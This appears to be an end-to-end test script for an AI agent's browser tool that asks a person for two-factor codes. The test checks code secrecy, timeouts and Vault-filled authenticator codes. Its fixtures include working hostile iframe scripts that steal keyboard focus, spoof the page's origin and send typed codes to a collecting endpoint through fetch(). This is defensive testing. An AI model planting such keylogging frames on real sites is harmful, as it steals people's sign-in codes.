/**
 * Input requests, with nothing faked but the model: real Chrome, the real browser MCP
 * child, the real browser RPC, the real App, and a site with a real two-factor form
 * whose codes expire. This script plays the AI Employee, calling the tools a model
 * would, and a person, calling the routes the card calls.
 *
 *   npm run test:input-requests
 *
 * The scenarios are the ones this was built for: a person answers straight away; a
 * person answers twelve hours later, after the page has died; a code gets refused; a
 * frame from another site trying to get hold of a code; and a login with its
 * authenticator saved in the Vault, which asks nobody at all.
 */
import assert from "node:assert/strict";
import { spawn, type ChildProcessWithoutNullStreams } from "node:child_process";
import type { Server } from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import readline from "node:readline";
import { fileURLToPath } from "node:url";
import { setTimeout as delay } from "node:timers/promises";
import express from "express";
import { generate, generateSecret } from "otplib";

import type { InputRequestView } from "../shared/inputRequests.js";
import { startTestServer } from "../cli/test/server.js";
import { AppDataSource } from "../server/db/datasource.js";
import { AIEmployee } from "../server/db/entities/AIEmployee.js";
import { EmployeeVaultGrant } from "../server/db/entities/EmployeeVaultGrant.js";
import { InputRequest } from "../server/db/entities/InputRequest.js";
import { Routine } from "../server/db/entities/Routine.js";
import { Run } from "../server/db/entities/Run.js";
import { createBrowserSession } from "../server/services/browserSessions.js";
import { issueMcpToken } from "../server/services/mcpTokens.js";
import { insert } from "../server/test/dbHarness.js";
import { createMemberOfNewCompany, sessionCookieFor } from "../server/test/apiAccess.js";
import { createVaultItem } from "../server/services/vault.js";
import { releasePage } from "../server/services/browserChromium.js";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

function say(line: string): void {
  // eslint-disable-next-line no-console
  console.log(`· ${line}`);
}

/**
 * A site that signs people in the way banks and accounting packages do. Each sign-in
 * makes a new code and "texts it" to `phone`, the code dies with its page, and a code
 * for an older sign-in is refused. It also takes authenticator codes, for the Vault.
 */
function startSite() {
  const app = express();
  app.use(express.urlencoded({ extended: false }));
  let pending: { code: string; bornAt: number } | null = null;
  const site = {
    /** What a person reads off their phone. */
    phone: null as string | null,
    accepted: [] as string[],
    refused: [] as string[],
    /** How long a page waits for its code. */
    pageLifeMs: 60_000,
    totpSecret: null as string | null,
    /** Whatever else the two-factor page carries, like somebody else's widget. */
    extra: "",
    boxPerDigit: false,
    url: "",
  };
  const page = (title: string, body: string) =>
    `<!doctype html><html><head><title>${title}</title></head><body><h1>${title}</h1>${body}</body></html>`;
  app.get("/login", (_req, res) => {
    res.send(
      page(
        "Sign in",
        `<form method="post" action="/login"><label>Email <input name="email" type="email"></label><label>Password <input name="password" type="password"></label><button type="submit">Sign in</button></form>`,
      ),
    );
  });
  app.post("/login", (_req, res) => {
    pending = { code: String(100000 + Math.floor(Math.random() * 899999)), bornAt: Date.now() };
    site.phone = pending.code;
    res.redirect("/two-factor");
  });
  app.get("/two-factor", (_req, res) => {
    if (!pending) return res.redirect("/login");
    const box = site.boxPerDigit
      ? `<input type="hidden" name="code" id="whole">${[1, 2, 3, 4, 5, 6]
          .map((n) => `<input class="digit" maxlength="1" size="1" aria-label="Digit ${n}">`)
          .join(
            "",
          )}<script>const boxes=[...document.querySelectorAll(".digit")];boxes.forEach((box,i)=>box.addEventListener("input",()=>{document.getElementById("whole").value=boxes.map((b)=>b.value).join("");if(box.value&&boxes[i+1])boxes[i+1].focus()}));</script>`
      : `<label>Code <input name="code" type="text" autocomplete="one-time-code"></label>`;
    res.send(
      page(
        "Enter your code",
        `<form method="post" action="/two-factor">${box}<button type="submit">Verify</button></form>${site.extra}`,
      ),
    );
  });
  app.post("/two-factor", async (req, res) => {
    const code = String(req.body.code ?? "");
    const fromAuthenticator = site.totpSecret
      ? code === (await generate({ secret: site.totpSecret, strategy: "totp" }))
      : false;
    if (fromAuthenticator) {
      if (site.accepted.includes(code)) {
        site.refused.push(code);
        return res.send(page("That code has been used", `<a href="/two-factor">Try again</a>`));
      }
    } else if (!pending || Date.now() - pending.bornAt > site.pageLifeMs) {
      site.refused.push(code);
      pending = null;
      return res.send(page("Your sign-in timed out", `<a href="/login">Sign in again</a>`));
    } else if (code !== pending.code) {
      site.refused.push(code);
      return res.send(
        page(
          "That code is wrong",
          `<form method="post" action="/two-factor"><label>Code <input name="code" type="text"></label><button type="submit">Verify</button></form>`,
        ),
      );
    }
    site.accepted.push(code);
    pending = null;
    res.send(page("VAT return filed", "<p>Welcome back.</p>"));
  });
  return new Promise<{ site: typeof site; close: () => Promise<void> }>((resolve) => {
    const server: Server = app.listen(0, "127.0.0.1", () => {
      site.url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
      resolve({
        site,
        close: () =>
          new Promise((done) => {
            server.closeAllConnections();
            server.close(() => done());
          }),
      });
    });
  });
}

/**
 * Somebody else's widget, reached as `localhost` so it's another site to Chrome. Whatever
 * reaches one of its boxes comes back here, as it would to whoever wrote it.
 */
function startHostileFrames() {
  const app = express();
  const got: string[] = [];
  app.get("/got", (req, res) => {
    got.push(String(req.query.value ?? ""));
    res.send("ok");
  });
  const report = `box.addEventListener("input",()=>fetch("/got?value="+encodeURIComponent(box.value)));`;
  // Takes the keyboard whenever it doesn't have it. No model has to fall for anything.
  app.get("/thief", (_req, res) => {
    res.send(
      `<!doctype html><label>Chat <input id="box"></label><script>const box=document.getElementById("box");setInterval(()=>{if(document.activeElement!==box)box.focus()},1);${report}</script>`,
    );
  });
  // Tells anyone who asks the element where it is that it's on the page around it.
  app.get("/liar", (req, res) => {
    const top = JSON.stringify(String(req.query.top));
    res.send(
      `<!doctype html><label>Verification code <input id="box" type="text"></label><script>const box=document.getElementById("box");Object.defineProperty(box,"ownerDocument",{value:{defaultView:{location:{href:${top}}},URL:${top}}});${report}</script>`,
    );
  });
  return new Promise<{ got: string[]; url: string; close: () => Promise<void> }>((resolve) => {
    const server: Server = app.listen(0, "127.0.0.1", () => {
      resolve({
        got,
        url: `http://localhost:${(server.address() as AddressInfo).port}`,
        close: () =>
          new Promise((done) => {
            server.closeAllConnections();
            server.close(() => done());
          }),
      });
    });
  });
}

/** The real browser MCP child, spoken to the way the agent's MCP client does. */
function startTools(env: Record<string, string>) {
  const script = path.join(root, "server/mcp-browser/index.mjs");
  const child: ChildProcessWithoutNullStreams = spawn(process.execPath, [script], {
    env: { ...process.env, ...env },
    stdio: ["pipe", "pipe", "pipe"],
  });
  const lines = readline.createInterface({ input: child.stdout });
  const pending = new Map<number, (value: { text: string; isError: boolean }) => void>();
  lines.on("line", (line) => {
    const message = JSON.parse(line) as {
      id?: number;
      result?: { content?: Array<{ text?: string }>; isError?: boolean };
    };
    if (typeof message.id !== "number") return;
    pending.get(message.id)?.({
      text: (message.result?.content ?? []).map((part) => part.text ?? "").join("\n"),
      isError: message.result?.isError === true,
    });
    pending.delete(message.id);
  });
  let nextId = 0;
  const call = (name: string, args: Record<string, unknown> = {}) => {
    const id = ++nextId;
    const reply = new Promise<{ text: string; isError: boolean }>((resolve) =>
      pending.set(id, resolve),
    );
    child.stdin.write(
      `${JSON.stringify({ jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } })}\n`,
    );
    return reply;
  };
  return { call, close: () => child.kill("SIGTERM") };
}

const server = await startTestServer();
const { site, close: closeSite } = await startSite();
const hostile = await startHostileFrames();
let failed = false;
const closers: Array<() => unknown> = [];

try {
  const { user: person, company } = await createMemberOfNewCompany("owner", { name: "Valeria" });
  const cookie = await sessionCookieFor(person);
  const employee = await insert(AIEmployee, {
    companyId: company.id,
    name: "Mira",
    slug: "mira",
    role: "Finance",
    browserEnabled: true,
    browserAllowedHosts: "",
    browserApprovalRequired: false,
  });
  const routine = await insert(Routine, {
    employeeId: employee.id,
    name: "File VAT",
    slug: "file-vat",
    cronExpr: "0 9 1 * *",
    timeoutSec: 3600,
    body: "File the VAT return.",
  });

  /** One session of a Run: its own Run row, browser session and tool process. */
  const session = async (runId: string) => {
    const browser = await createBrowserSession({
      companyId: company.id,
      employeeId: employee.id,
      conversationId: null,
      runId,
    });
    const token = issueMcpToken(employee.id, company.id, {
      runId,
      routineId: routine.id,
      authority: "employee",
    });
    const tools = startTools({
      GENOSYN_MCP_API: `${server.baseUrl}/api/internal/mcp`,
      GENOSYN_MCP_TOKEN: token,
      GENOSYN_BROWSER_API: `${server.baseUrl}/api/internal/browser/sessions/${browser.id}`,
      GENOSYN_BROWSER_SESSION_ID: browser.id,
      GENOSYN_BROWSER_SESSION_TOKEN: browser.mcpToken,
    });
    closers.push(() => tools.close());
    closers.push(() => releasePage(browser.id, "manual"));
    return { browser, tools };
  };

  const newRun = (): Promise<Run> =>
    insert(Run, {
      routineId: routine.id,
      employeeId: employee.id,
      status: "running",
      startedAt: new Date(),
      triggerKind: "schedule",
      continuationDeadlineAt: new Date(Date.now() + 3_600_000),
    });

  const signIn = async (tools: ReturnType<typeof startTools>): Promise<string> => {
    const opened = await tools.call("browser_open", { url: `${site.url}/login` });
    assert.equal(opened.isError, false, opened.text);
    assert.match(opened.text, /Sign in/);
    await tools.call("browser_fill", { selector: 'input[name="email"]', value: "mira@acme.test" });
    await tools.call("browser_fill", { selector: 'input[name="password"]', value: "pw" });
    const submitted = await tools.call("browser_click", { selector: 'button[type="submit"]' });
    assert.match(submitted.text, /Enter your code/, submitted.text);
    return submitted.text;
  };

  const api = (route: string, method = "GET", body?: unknown) =>
    fetch(`${server.baseUrl}/api/companies/${company.id}/input-requests${route}`, {
      method,
      headers: {
        Cookie: cookie,
        Origin: server.baseUrl,
        ...(body === undefined ? {} : { "Content-Type": "application/json" }),
      },
      body: body === undefined ? undefined : JSON.stringify(body),
    });

  const open = async (): Promise<InputRequestView[]> => {
    const res = await api("");
    assert.equal(res.status, 200, await res.clone().text());
    return (await res.json()) as InputRequestView[];
  };

  const untilAsking = async (): Promise<InputRequestView> => {
    for (let i = 0; i < 200; i += 1) {
      const asking = (await open()).find((row) => row.status === "asking");
      if (asking) return asking;
      await delay(50);
    }
    throw new Error("Nobody was ever asked");
  };

  const askForCode = (tools: ReturnType<typeof startTools>) =>
    tools.call("browser_ask_person", {
      needs: "code",
      label: "FreeAgent sign-in code",
      why: "I'm filing the VAT return and it wants the code from your phone.",
      selector: 'input[name="code"]',
      submitSelector: 'button[type="submit"]',
    });

  // ─────────────── someone's around
  say("a person is around, so the page gets its code straight away");
  {
    const run = await newRun();
    const { tools } = await session(run.id);
    await signIn(tools);
    const asked = askForCode(tools);
    const card = await untilAsking();
    assert.equal(card.pageOrigin, site.url, "the real address, read from the browser");
    assert.equal(card.status, "asking");
    assert.ok(card.askingUntil);
    const code = site.phone!;
    const res = await api(`/${card.id}/answer`, "POST", { value: code });
    assert.equal(res.status, 200, await res.clone().text());
    const reply = await asked;
    assert.equal(reply.isError, false, reply.text);
    assert.match(reply.text, /VAT return filed/, "the model reads the page that came back");
    assert.deepEqual(site.accepted, [code], "the site got the code");
    assert.ok(!reply.text.includes(code), "the model never sees the code");
    const row = await AppDataSource.getRepository(InputRequest).findOneByOrFail({ id: card.id });
    assert.equal(row.status, "submitted");
    assert.equal(row.encryptedAnswer, null);
    assert.equal((await open()).length, 0, "and it's off the person's list");
    say("  the page accepted it, and the model never saw it");
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
  }

  // ─────────────── a code that gets refused
  say("a person mistypes, so the page refuses it and they're asked again");
  {
    site.accepted.length = 0;
    const run = await newRun();
    const { tools } = await session(run.id);
    await signIn(tools);
    let asked = askForCode(tools);
    let card = await untilAsking();
    await api(`/${card.id}/answer`, "POST", { value: "000000" });
    let reply = await asked;
    assert.match(reply.text, /That code is wrong/);
    assert.match(reply.text, /call browser_ask_person again/);
    asked = askForCode(tools);
    card = await untilAsking();
    assert.equal(card.lastCodeRefused, true, "the card says so");
    await api(`/${card.id}/answer`, "POST", { value: site.phone });
    reply = await asked;
    assert.match(reply.text, /VAT return filed/);
    assert.equal(
      await AppDataSource.getRepository(InputRequest).countBy({ runId: run.id }),
      1,
      "the same request all the way through",
    );
    say("  asked again on the same request, and the second code worked");
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
  }

  // ─────────────── twelve hours later
  say("nobody's around, and twelve hours pass");
  {
    site.accepted.length = 0;
    const run = await newRun();
    const first = await session(run.id);
    await signIn(first.tools);
    const deadCode = site.phone!;
    const asked = askForCode(first.tools);
    const card = await untilAsking();
    // Nobody comes before the page stops waiting.
    await AppDataSource.getRepository(InputRequest).update(
      { id: card.id },
      { askingUntil: new Date(Date.now() - 1_000) },
    );
    const lapsed = await asked;
    assert.match(lapsed.text, /Nobody answered/);
    assert.match(lapsed.text, /pauses now and costs nothing/);
    const waiting = (await open())[0];
    assert.equal(waiting.status, "waiting");
    say("  the page stopped waiting, and the Run would pause here");
    await AppDataSource.getRepository(Run).update(
      { id: run.id },
      {
        status: "queued",
        pauseReason: "person",
        pauseCount: 1,
        personPauses: 1,
        waitingOnInputRequestId: card.id,
      },
    );
    first.tools.close();
    await releasePage(first.browser.id, "manual");

    // Twelve hours on, the person types the code they were sent. It's dead, and a page
    // that took it would only fail: there's nothing waiting for it.
    site.pageLifeMs = 0;
    const tooLate = await api(`/${card.id}/answer`, "POST", { value: deadCode });
    assert.equal(tooLate.status, 409);
    assert.match(await tooLate.text(), /Press I'm ready first/);
    assert.deepEqual(
      site.refused.filter((code) => code === deadCode),
      [],
      "it never reached the site",
    );
    say("  a code typed now is refused before it can reach the site");

    // So they say they're ready instead.
    const ready = await api(`/${card.id}/ready`, "POST", {});
    assert.equal(ready.status, 200, await ready.clone().text());
    assert.equal(((await ready.json()) as InputRequestView).status, "ready");
    const released = await AppDataSource.getRepository(Run).findOneByOrFail({ id: run.id });
    assert.equal(released.waitingOnInputRequestId, null, "the Run is let go");
    say("  they press I'm ready, and the Run is let go");

    // The same Run comes back, signs in again from the start, and asks on the new page.
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "running" });
    site.pageLifeMs = 60_000;
    const second = await session(run.id);
    await signIn(second.tools);
    const freshCode = site.phone!;
    assert.notEqual(freshCode, deadCode, "a new sign-in, a new code");
    const askedAgain = askForCode(second.tools);
    const box = await untilAsking();
    assert.equal(box.id, card.id, "one request, all the way through");
    assert.equal(box.browserSessionId, second.browser.id, "held by the session that came back");
    const answered = await api(`/${box.id}/answer`, "POST", { value: freshCode });
    assert.equal(answered.status, 200);
    const reply = await askedAgain;
    assert.match(reply.text, /VAT return filed/, reply.text);
    assert.deepEqual(site.accepted, [freshCode]);
    assert.ok(!reply.text.includes(freshCode));
    say("  it signed in again, asked again, and the fresh code worked");
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
  }

  // ─────────────── an action on someone's phone
  say("a push to approve on a phone, where a person only has to press Done");
  {
    const run = await newRun();
    const { tools } = await session(run.id);
    await signIn(tools);
    const asked = tools.call("browser_ask_person", {
      needs: "action",
      label: "Approve the sign-in on your phone",
    });
    const card = await untilAsking();
    assert.equal(card.kind, "action");
    const done = await api(`/${card.id}/answer`, "POST", {});
    assert.equal(done.status, 200);
    const reply = await asked;
    assert.match(reply.text, /They say they've done it/);
    say("  the session carried on as soon as they pressed Done");
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
  }

  // ─────────────── the session going away
  say("the session is stopped while it holds the page");
  {
    const run = await newRun();
    const { tools } = await session(run.id);
    await signIn(tools);
    void askForCode(tools);
    const card = await untilAsking();
    tools.close();
    for (let i = 0; i < 100; i += 1) {
      const row = await AppDataSource.getRepository(InputRequest).findOneByOrFail({ id: card.id });
      if (row.status !== "asking") break;
      await delay(50);
    }
    const row = await AppDataSource.getRepository(InputRequest).findOneByOrFail({ id: card.id });
    assert.equal(row.status, "waiting", "it stops holding the page at once, not after 4 minutes");
    say("  it let go at once, rather than holding a dead page for four minutes");
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "error" });
    await AppDataSource.getRepository(InputRequest).update(
      { id: card.id },
      { status: "closed", closeReason: "test" },
    );
  }

  // ─────────────── somebody else's frame on the page
  say("a frame from another site takes the keyboard while a code is going in");
  {
    site.accepted.length = 0;
    hostile.got.length = 0;
    site.extra = `<iframe title="Chat" src="${hostile.url}/thief"></iframe>`;
    const run = await newRun();
    const { tools } = await session(run.id);
    await signIn(tools);
    const asked = askForCode(tools);
    const card = await untilAsking();
    const code = site.phone!;
    await api(`/${card.id}/answer`, "POST", { value: code, pageOrigin: card.pageOrigin });
    const reply = await asked;
    assert.equal(reply.isError, true, reply.text);
    assert.match(reply.text, /took the keyboard/);
    assert.ok(!reply.text.includes(code), "the model never sees the code");
    await delay(300);
    assert.ok(
      hostile.got.every((typed) => typed.length <= 1),
      `the frame got no more than a key that raced the check: ${JSON.stringify(hostile.got)}`,
    );
    assert.deepEqual(site.accepted, [], "and nothing was submitted");
    say("  typing stopped, the frame got nothing usable, and the model was told");
    site.extra = "";
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
  }

  say("a frame from another site says it's the page, to get a code typed into it");
  {
    hostile.got.length = 0;
    site.extra = `<iframe title="Verify" src="${hostile.url}/liar?top=${encodeURIComponent(`${site.url}/two-factor`)}"></iframe>`;
    const run = await newRun();
    const { tools } = await session(run.id);
    const seen = await signIn(tools);
    const ref = /textbox "Verification code" \[ref=(\w+)\]/.exec(seen)?.[1];
    assert.ok(ref, `the frame's box is in the snapshot:\n${seen}`);
    const refused = await tools.call("browser_ask_person", {
      needs: "code",
      label: "Sign-in code",
      selector: `aria-ref=${ref}`,
    });
    assert.equal(refused.isError, true, refused.text);
    assert.match(refused.text, /frame from a different site/);
    assert.equal((await open()).length, 0, "and nobody was asked");
    say("  refused before anyone was asked, whatever the frame said about itself");
    site.extra = "";
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
  }

  say("a form with a box per digit, which moves along as each one's typed");
  {
    site.accepted.length = 0;
    site.boxPerDigit = true;
    const run = await newRun();
    const { tools } = await session(run.id);
    await signIn(tools);
    const asked = tools.call("browser_ask_person", {
      needs: "code",
      label: "FreeAgent sign-in code",
      selector: "input.digit",
      submitSelector: 'button[type="submit"]',
    });
    const card = await untilAsking();
    const code = site.phone!;
    await api(`/${card.id}/answer`, "POST", { value: code, pageOrigin: card.pageOrigin });
    const reply = await asked;
    assert.equal(reply.isError, false, reply.text);
    assert.match(reply.text, /VAT return filed/, reply.text);
    assert.deepEqual(site.accepted, [code]);
    say("  each digit found its box, and the page accepted it");
    site.boxPerDigit = false;
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
  }

  // ─────────────── the Vault, asking nobody
  say("the login's authenticator is in the Vault, so nobody needs to be asked");
  {
    site.accepted.length = 0;
    site.totpSecret = generateSecret();
    const item = await createVaultItem({
      companyId: company.id,
      actor: { userId: person.id, role: "owner" },
      type: "login",
      visibility: "restricted",
      payload: {
        title: "FreeAgent",
        username: "mira@acme.test",
        secret: "pw",
        websiteUrl: site.url,
        notes: "",
        totp: null,
        passkeys: [],
        passkeyRegistrationLease: null,
      },
      totpSetupKey: site.totpSecret,
    });
    await insert(EmployeeVaultGrant, {
      companyId: company.id,
      vaultItemId: item.id,
      employeeId: employee.id,
      accessLevel: "use",
    });
    const run = await newRun();
    const { tools } = await session(run.id);
    await signIn(tools);

    const asked = await askForCode(tools);
    assert.equal(asked.isError, true, "nobody gets pinged for a code the Vault holds");
    assert.match(asked.text, /Nobody was asked/);
    assert.match(asked.text, /browser_fill_vault/);
    assert.equal((await open()).length, 0);
    say("  browser_ask_person refused, and pointed at the Vault");

    const filled = await tools.call("browser_fill_vault", {
      itemId: item.id,
      field: "totp",
      selector: 'input[name="code"]',
    });
    assert.equal(filled.isError, false, filled.text);
    const submitted = await tools.call("browser_click", { selector: 'button[type="submit"]' });
    assert.match(submitted.text, /VAT return filed/, submitted.text);
    const [used] = site.accepted;
    assert.ok(!filled.text.includes(used) && !submitted.text.includes(used));
    say("  the code was filled and accepted, and the model never saw it");

    // Signing in again at once: the same code would read as a wrong one to the site.
    await signIn(tools);
    const started = Date.now();
    const again = await tools.call("browser_fill_vault", {
      itemId: item.id,
      field: "totp",
      selector: 'input[name="code"]',
    });
    assert.equal(again.isError, false, again.text);
    const secondSubmit = await tools.call("browser_click", { selector: 'button[type="submit"]' });
    assert.match(secondSubmit.text, /VAT return filed/, secondSubmit.text);
    assert.equal(site.accepted.length, 2);
    assert.notEqual(site.accepted[0], site.accepted[1], "it waited for a fresh code");
    say(`  a second sign-in waited ${Math.round((Date.now() - started) / 1000)}s for a fresh code`);
    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
  }

  say("all good");
} catch (error) {
  failed = true;
  // eslint-disable-next-line no-console
  console.error(error);
} finally {
  for (const close of closers) {
    try {
      await close();
    } catch {
      // Tearing down.
    }
  }
  await closeSite();
  await hostile.close();
  await server.close().catch(() => undefined);
}
process.exit(failed ? 1 : 0);
